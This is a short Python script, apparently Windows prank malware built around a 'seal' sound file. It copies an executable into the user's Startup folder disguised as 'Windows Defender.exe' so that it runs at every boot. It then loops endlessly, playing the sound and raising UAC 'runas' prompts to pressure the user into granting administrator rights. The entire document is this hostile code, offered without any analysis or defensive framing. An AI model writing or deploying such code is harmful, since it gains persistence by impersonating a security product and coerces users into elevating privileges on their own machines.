from sys import exit, executable
from os import startfile, getlogin, getenv
from ctypes import windll

path = getenv('temp') + "\\seal.mp3"
startup_path = str(getenv(
    "SystemDrive") + "\\Users\\" + getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\")
try:
    def force_admin():
        while True:
            startfile(path)
            windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)


    with open("seal_bytes.txt", "rb")as f:
        seal_bytes = f.read()

    with open(path, "wb+")as f:
        f.write(seal_bytes)

    with open("Seal.exe", "rb")as f:
        exe_bytes = f.read()

    with open(startup_path + "Windows Defender.exe", "wb+")as f:
        f.write(exe_bytes)

    with open(startup_path + "seal_bytes.txt", "wb+")as f:
        f.write(seal_bytes)

    force_admin()

except:
    exit()
